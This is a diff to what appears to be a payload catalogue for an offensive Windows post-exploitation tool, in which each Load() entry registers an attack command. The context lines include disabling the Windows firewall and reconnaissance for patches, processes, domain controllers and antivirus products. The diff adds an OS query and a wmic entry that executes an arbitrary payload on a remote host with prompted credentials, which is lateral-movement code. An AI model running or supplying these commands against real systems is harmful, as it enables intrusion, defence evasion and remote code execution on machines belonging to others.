@@ -144,9 +144,19 @@ Load({payload: "netsh firewall set opmode disable", desc: "Disable Windows Firew
 // ################### WMIC ######################
 
 Load({payload: "wmic qfe get hotfixid", desc: "Get Patch IDs", category: "WMIC"})
+Load({payload: "wmic OS get Caption,CSDVersion,OSArchitecture,Version", desc: "Get OS Information", category: "WMIC"})
 Load({payload: "wmic process list full", desc: "List all processes and their attributes", category: "WMIC"})
 Load({payload: "wmic ntdomain list", desc: "Get Domain and DC Information", category: "WMIC"})
 Load({payload: "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct", desc: "List Anti-Virus Product(s)", category: "WMIC"})
+Load({payload: "wmic /user:<PROMPT (username)> /password:<PROMPT (password)> /node:<RHOST> process call create \"cmd.exe /c <PROMPT (payload)>\"", desc: "Execute a process remotely", category: "WMIC",
+		callback: function(bro){
+			question("Enter the username");
+			question("Enter the password");
+			question("What payload would you like to execute?");
+			ask.some(questions, bro);
+		}
+})
+//
 
 // ############### Powershell ######################
 
